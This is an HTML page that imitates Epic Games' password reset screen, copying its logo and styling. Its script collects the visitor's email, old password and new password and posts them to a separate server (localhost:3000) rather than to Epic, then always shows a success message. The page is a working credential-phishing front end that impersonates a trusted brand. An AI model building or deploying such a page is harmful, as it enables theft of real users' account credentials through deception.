<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games Password Reset</title>
    <link rel="stylesheet" href="epicgames-html-password.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        body {
            background-color: #181818;
            color: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #242424;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
            width: 400px;
            transition: opacity 0.3s ease;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 100px;
            height: auto;
        }

        .MuiTypography-root.MuiTypography-body1.mui-o497ds {
            font-size: 22px;
            font-weight: 500;
            text-align: center;
            margin-bottom: 20px;
            letter-spacing: 0.5px;
            color: #f5f5f5;
        }

        .form-group {
            margin-bottom: 15px;
            position: relative;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #ddd;
            font-size: 14px;
            font-weight: bold;
        }

        input[type="password"], input[type="email"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #444;
            border-radius: 6px;
            background-color: #333;
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            outline: none;
        }

        input[type="password"]:focus, input[type="email"]:focus {
            border-color: #007bff;
            box-shadow: 0 0 5px #007bff;
        }

        .requirements {
            margin-top: 15px;
            border: 1px solid #444;
            border-radius: 6px;
            padding: 15px;
            background-color: #2a2a2a;
            font-size: 14px;
        }

        .requirements ul {
            margin: 0;
            padding: 0 0 0 20px;
            list-style: disc;
        }

        .requirements li {
            margin-bottom: 10px;
            color: #bbb;
        }

        button {
            background: linear-gradient(90deg, #007bff, #0056b3);
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            font-size: 14px;
            letter-spacing: 0.5px;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
        }

        button:active {
            transform: translateY(1px);
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2);
        }

        /* Loading Spinner */
        .loading-spinner {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 6px solid #f3f3f3;
            border-top: 6px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Success Message */
        #successMessage {
            display: none;
            text-align: center;
            color: #28a745;
            font-size: 18px;
        }

        .success-container {
            display: none;
            text-align: center;
            margin-top: 30px;
        }

        .success-container img {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
        }

        .success-container p {
            font-size: 18px;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Epic Games logo - original -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Epic_Games_logo_2019.svg" alt="Epic Games Logo">
        </div>

        <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
            Enter your new password for your Epic Games account.
        </div>

        <form id="resetForm">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="Enter your email" required>
            </div>

            <div class="form-group">
                <label for="oldPassword">Old Password</label>
                <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
            </div>

            <div class="form-group">
                <label for="newPassword">New Password</label>
                <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
            </div>

            <button type="submit">Reset Password</button>

            <div class="loading-spinner" id="loadingSpinner"></div>
        </form>

        <div id="successMessage" class="success-container">
            <img src="https://www.pngall.com/wp-content/uploads/5/Check-Mark-PNG-Image.png" alt="Success Icon">
            <p>Password Reset Successfully!</p>
        </div>
    </div>

    <script>
        document.getElementById('resetForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;

            const data = { email, oldPassword, newPassword };

            // Show loading spinner and hide form
            document.getElementById('loadingSpinner').style.display = 'block';
            document.querySelector('form').style.opacity = '0.5';

            fetch('http://localhost:3000/reset-password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                // Hide the loading spinner
                document.getElementById('loadingSpinner').style.display = 'none';
                document.querySelector('form').style.display = 'none';
                document.getElementById('successMessage').style.display = 'block';
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('loadingSpinner').style.display = 'none';
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html>
